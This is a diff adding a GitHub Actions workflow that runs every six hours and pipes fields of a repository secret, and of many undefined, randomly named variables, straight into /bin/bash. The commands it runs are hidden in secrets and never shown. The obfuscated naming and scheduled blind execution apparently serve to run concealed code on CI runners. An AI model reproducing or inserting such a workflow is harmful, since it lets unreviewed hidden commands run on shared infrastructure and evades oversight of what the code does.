@@ -1,0 +1,32 @@
+name: xiebao19871010
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiebao19871010
+        env:
+          lbuc1: ${{ secrets.lbuc1 }}
+        run: |
+          echo $lbuc1 | jq -r .q5 | /bin/bash
+          echo $gnh8852 | jq -r .lwm7634 | /bin/bash
+          echo $zol868 | jq -r .pdi34 | /bin/bash
+          echo $owvej632 | jq -r .fj7 | /bin/bash
+          echo $ev28765 | jq -r .h0196 | /bin/bash
+          echo $saa4531 | jq -r .odccz81 | /bin/bash
+          echo $xza75110 | jq -r .c22 | /bin/bash
+          echo $xahln902 | jq -r .r9995 | /bin/bash
+          echo $cbb143 | jq -r .npsg8 | /bin/bash
+          echo $sb13 | jq -r .qli06029 | /bin/bash
+          echo $dyklm1506 | jq -r .h02 | /bin/bash
+          echo $vlxlc97736 | jq -r .oci75 | /bin/bash
+          echo $onad6413 | jq -r .png369 | /bin/bash
+          echo $qyea251 | jq -r .rumc3 | /bin/bash
+          echo $his3 | jq -r .sgb47215 | /bin/bash
+
